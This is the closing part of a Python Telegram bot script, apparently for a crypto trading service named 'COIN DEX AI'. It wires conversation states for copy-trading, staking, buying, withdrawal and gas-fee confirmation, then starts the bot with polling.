        CallbackQueryHandler(withdraw_start, pattern='^withdraw_'),
    ],
    states={
        ENTER_TRADER_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_copy_address)],
        ENTER_CONTRACT_ADDR: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_contract_address)],
        ENTER_STAKE_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_stake_amount)],
        ENTER_BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_buy_amount)],
        ENTER_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_amount)],
        ENTER_WITHDRAW_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdraw_address)],
        CONFIRM_GAS_FEE: [CallbackQueryHandler(confirm_gas_fee_paid, pattern='^confirm_gas_fee$')],
    },
    fallbacks=[CommandHandler('cancel', lambda u, c: u.message.reply_text("Cancelled", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Menu", callback_data='back_menu')]])))]
)


# ============ START BOT ============

if __name__ == '__main__':
    print("🚀 COIN DEX AI Bot is starting...")
    
    application = Application.builder().token(config.BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ COIN DEX AI is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)
